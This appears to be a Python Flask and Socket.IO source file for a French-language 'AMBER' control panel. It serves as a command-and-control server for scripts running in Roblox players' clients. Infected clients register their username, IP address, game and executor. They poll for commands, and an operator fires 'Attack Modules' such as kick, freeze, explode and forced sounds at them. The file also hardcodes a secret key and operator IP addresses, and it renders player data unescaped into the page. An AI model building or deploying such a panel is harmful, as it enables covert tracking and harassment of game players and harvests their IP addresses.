from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "amber_cyber_key_777"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# --- CONFIGURATION ---
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = [] 

def add_to_history(action, p_data):
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": p_data.get("username", "Inconnu"),
        "userid": p_data.get("userid", "0"),
        "ip": p_data.get("ip", "0.0.0.0"),
        "executor": p_data.get("executor", "N/A"),
        "gameName": p_data.get("gameName", "Unknown Game"),
        "gameId": p_data.get("gameId", "0"),
        "action": action
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

# --- INTERFACE HTML (Thème Orange/Yellow) ---
HTML = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>AMBER CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #0a0800;
        --card-bg: rgba(25, 20, 0, 0.9);
        --accent: #ffcc00; /* Jaune Orange */
        --accent-glow: rgba(255, 204, 0, 0.3);
        --danger: #ff4400;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
        font-family: 'Rajdhani', sans-serif; background: var(--bg); color: #fff; 
        background-image: radial-gradient(circle at 50% 0%, #332200 0%, #0a0800 80%);
        min-height: 100vh;
    }

    .container { max-width: 1800px; margin: auto; padding: 15px; }
    header { text-align: center; margin-bottom: 25px; border-bottom: 1px solid var(--accent-glow); padding-bottom: 15px; }
    h1 { font-family: 'Orbitron'; font-size: 1.8rem; color: var(--accent); text-shadow: 0 0 15px var(--accent); letter-spacing: 5px; }

    .main-layout { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }

    .card { 
        background: var(--card-bg); border: 1px solid rgba(255, 204, 0, 0.1); 
        border-radius: 12px; padding: 15px; position: relative; transition: 0.2s;
        backdrop-filter: blur(10px);
    }
    .card:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }

    .trash-player { position: absolute; top: 12px; right: 12px; background: none; border: none; color: #555; cursor: pointer; font-size: 1.1rem; }
    .trash-player:hover { color: var(--danger); }

    .status-badge { display: flex; align-items: center; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; color: var(--accent); opacity: 0.8; }
    .dot { width: 7px; height: 7px; border-radius: 50%; margin-right: 6px; background: #333; }
    .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }

    .name a { font-family: 'Orbitron'; font-size: 1.1rem; color: #fff; text-decoration: none; }
    .name a:hover { color: var(--accent); }

    .info-box { font-size: 0.8rem; color: #bbb; margin: 10px 0; line-height: 1.5; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px; }
    .info-box b { color: var(--accent); }
    .info-box a { color: #fff; text-decoration: underline; }

    .section-label { color: var(--accent); font-size: 0.65rem; letter-spacing: 1px; margin: 15px 0 8px; text-transform: uppercase; font-weight: bold; }

    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
    .btn { 
        padding: 10px; border: none; border-radius: 6px; cursor: pointer; 
        font-weight: 700; font-family: 'Rajdhani'; font-size: 0.8rem; text-transform: uppercase; transition: 0.2s;
    }
    .btn-troll { background: rgba(255, 204, 0, 0.15); border: 1px solid var(--accent); color: var(--accent); }
    .btn-troll:hover { background: var(--accent); color: #000; }
    
    .btn-kick { background: linear-gradient(45deg, #cc8800, #ffaa00); color: #000; }
    .btn-undo { background: #1a1a1a; color: #777; border: 1px solid #333; }
    .btn-undo:hover { border-color: #555; color: #fff; }

    /* HISTORIQUE */
    .history-panel { background: rgba(0,0,0,0.5); border: 1px solid #222; border-radius: 12px; padding: 15px; height: 85vh; display: flex; flex-direction: column; }
    .history-list { flex-grow: 1; overflow-y: auto; }
    .history-item { padding: 12px; border-bottom: 1px solid #1a1a1a; font-size: 0.8rem; }
    .hist-time { color: var(--accent); font-family: monospace; }
    .hist-user { color: #fff; font-weight: bold; }

    /* MODALS */
    .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; }
    .modal.active { display: flex; }
    .modal-content { background: #111; padding: 30px; border: 2px solid var(--accent); border-radius: 15px; width: 350px; text-align: center; }
    .modal-content input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: #fff; margin: 15px 0; border-radius: 8px; font-family: 'Rajdhani'; }
</style>
</head>
<body>

<div class="container">
    <header><h1>AMBER PANEL SYSTEM</h1></header>
    
    <div class="main-layout">
        <section><div class="grid" id="players"></div></section>

        <aside>
            <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-family:'Orbitron'; font-size:0.7rem;">
                <span style="color:var(--accent)">DÉTAILS_HISTORIQUE</span>
                <button onclick="clearHistory()" style="background:none; border:none; color:#444; cursor:pointer;">[ PURGE ]</button>
            </div>
            <div class="history-panel"><div class="history-list" id="history-list"></div></div>
        </aside>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content">
    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">KICK_USER</h2>
    <input type="text" id="kickReason" placeholder="Raison du kick...">
    <div style="display:flex; gap:10px">
        <button class="btn btn-undo" style="flex:1" onclick="closeModal('kickModal')">ANNULER</button>
        <button class="btn btn-kick" style="flex:1" id="confirmKickBtn">CONFIRMER</button>
    </div>
</div></div>

<div class="modal" id="soundModal"><div class="modal-content">
    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">AUDIO_ID</h2>
    <input type="text" id="soundAssetId" placeholder="Asset ID (ex: 12345)">
    <div style="display:flex; gap:10px">
        <button class="btn btn-undo" style="flex:1" onclick="closeModal('soundModal')">ANNULER</button>
        <button class="btn btn-troll" style="flex:1; background:var(--accent); color:#000" id="confirmSoundBtn">JOUER</button>
    </div>
</div></div>

<script>
const socket = io();
let selectedUid = null;

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function sendTroll(uid, cmd, val = null) {
    // Si c'est un kick, 'val' est la raison. Si c'est sound, 'val' est l'assetId.
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, 
    body: JSON.stringify({userid: uid, cmd: cmd, value: val})});
}

document.getElementById('confirmKickBtn').onclick = () => {
    const reason = document.getElementById('kickReason').value;
    sendTroll(selectedUid, 'kick', reason || "Kicked by Admin");
    closeModal('kickModal');
};

document.getElementById('confirmSoundBtn').onclick = () => {
    const sid = document.getElementById('soundAssetId').value;
    sendTroll(selectedUid, 'playsound', sid);
    closeModal('soundModal');
};

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <button class="trash-player" onclick="fetch('/delete_player',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}'})})">✕</button>
            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'CONNECTED' : 'IDLE'}</div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            <div class="info-box">
                IP: <b>${p.ip}</b><br>
                EX: <b>${p.executor}</b><br>
                GAME: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a>
            </div>
            
            <div class="section-label">Attack Modules</div>
            <div class="btn-group">
                <button class="btn btn-kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn btn-troll" style="background:#ff8800; color:#000; border:none" onclick="openSoundModal('${id}')">SOUND</button>
            </div>
            
            <div class="section-label">Restore Modules</div>
            <div class="btn-group">
                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">STOP AUDIO</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <span class="hist-time">[${log.time}]</span> <span class="hist-user">${log.user}</span> <span style="font-size:0.7rem; color:#444">(${log.ip})</span>
            <div style="color:var(--accent); margin-top:3px; font-weight:bold">${log.action}</div>
            <div style="font-size:0.7rem; color:#666; margin-top:2px">
                <a href="https://www.roblox.com/fr/games/${log.gameId}" target="_blank">${log.gameName}</a> | ${log.executor}
            </div>
        </div>
    `).join('');
});
</script>
</body>
</html>
"""

# --- ROUTES PYTHON ---

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd, val = str(d["userid"]), d["cmd"], d.get("value")
    
    # On stocke la commande et la valeur (raison ou assetId)
    pending_commands[uid] = {"command": cmd, "value": val}
    
    p_data = connected_players.get(uid, {"username": "Unknown"})
    log_msg = f"CMD: {cmd.upper()}"
    if val: log_msg += f" ({val})"
    
    add_to_history(log_msg, p_data)
    return jsonify({"sent": True})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            d["userid"] = uid
            if uid not in connected_players: add_to_history("SYSTÈME: CONNECTÉ", d)
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Click to view"),
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            return jsonify(pending_commands.pop(uid))
        return jsonify({})

# (Le reste des fonctions index, delete_player, clear_history et broadcast_loop reste identique)
@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        add_to_history("SYSTÈME: SUPPRIMÉ", connected_players[uid])
        del connected_players[uid]
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
        for uid in to_remove:
            add_to_history("SYSTÈME: DÉCONNECTÉ", connected_players[uid])
            del connected_players[uid]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
